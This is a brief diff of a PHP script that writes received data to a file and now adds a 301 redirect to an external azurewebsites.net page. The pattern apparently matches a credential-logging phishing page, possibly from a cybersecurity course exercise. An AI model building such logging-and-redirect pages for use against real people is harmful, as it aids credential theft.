@@ -31,4 +31,5 @@ fwrite($fp, $data2);
 fwrite ($fp, "\n");
 fclose($fp);
 }
-?>
+header("Location: https://controlcursociber.azurewebsites.net/cerrar.php", true, 301);
+exit();?>
